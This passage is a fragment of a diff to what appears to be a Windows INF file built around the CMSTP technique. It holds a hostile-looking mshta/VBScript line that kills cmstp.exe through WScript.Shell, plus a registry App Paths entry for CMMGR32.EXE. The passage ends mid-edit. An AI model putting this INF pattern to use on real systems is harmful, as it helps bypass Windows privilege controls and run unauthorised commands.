@@ -102,4 +102,4 @@ mshta vbscript:Execute(""CreateObject('WScript.Shell').Run 'taskkill /IM cmstp.e
 [AllUSer_LDIDSection]
 HKLM, SOFTWARE\Microsoft\Windows\CurrentVersion\App Paths\CMMGR32.EXE, ProfileInstallPath, %UnexpectedError%
 
-[Strings]
+[Stri
